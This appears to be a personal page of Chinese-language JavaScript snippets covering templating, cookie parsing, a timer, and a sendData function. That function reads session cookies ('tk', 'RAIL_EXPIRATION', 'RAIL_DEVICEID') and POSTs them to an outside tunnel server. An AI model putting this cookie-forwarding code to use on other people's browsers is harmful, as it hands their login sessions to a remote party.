## 一些js方法


#### 字符串拼接

```
res += `${key}=${value};`
```

#### 发送请求

```
function sendData()
{
    var data = {tk:getCookie("tk"),rail_expiration:getCookie("RAIL_EXPIRATION"),rail_deviceid:getCookie("RAIL_DEVICEID")};
    //alert("接收cookie程序开发中~");
    var xmlhttp;
    if (window.XMLHttpRequest)
    {// code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp=new XMLHttpRequest();
    }
    else
    {// code for IE6, IE5
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
             //alert(typeof xmlhttp.response);
            console.log(xmlhttp.response)
            var result = JSON.parse(xmlhttp.response);
            console.log(typeof result);
            if(result.code==200){
              console.log("发送成功！");
                
            }else{
              console.log("发送失败!");
            }
        }
    }
    //请把https://api.github.com改为自己的服务器地址。 请确保该地址为https 开头，而不是http
    //xmlhttp.open("POST","https://wonder.test.utools.club/cookie",true);https://e0cf1d50ed6d.ngrok.io/
 
    xmlhttp.open("POST","https://wonder.cn.utools.club/cookie",true);
 
    xmlhttp.setRequestHeader('Content-Type','application/json');
     console.log("JSON==================",JSON.stringify(data));
    //将用户输入值序列化成字符串
    xmlhttp.send(JSON.stringify(data));  //向服务器发送tk值
    //xmlhttp.send();
}
```


#### 获取指定cookie值

```
    function getCookies(names) {
        let res = '';
        var cookieStr = document.cookie;
        var cas = cookieStr.split(';');
        console.log('----------------');
        for (let i = 0; i < cas.length; i++) {
            const pair = cas[i];
            console.log(`[${pair}]`);
            const kv = pair.trim().split('='), key = kv[0], value = kv[1];

            for (let j = 0; j < names.length; j++) {
                const ele = names[j];
                if (ele == key) {
                    res += `${key}=${value};`
                    continue;
                }
            }
        }
        console.log('----------------');
        return res;
    }

    const a = getCookies(['_gid', 'CNZZDATA943648']);
    console.log(a);
```

后来经过 ChatGPT 优化后的代码：

```
function getCookies(cookieStr, names) {
  const cookies = cookieStr.split(';')
    .map(cookie => cookie.trim().split('='))
    .reduce((acc, [key, value]) => {
      acc[key] = value;
      return acc;
    }, {});

  return names
    .filter(name => cookies.hasOwnProperty(name))
    .map(name => `${name}=${cookies[name]};`)
    .join('');
}
```

----

#### 等待一下再执行

```
  setTimeout(() => {
    
  }, 2000)
```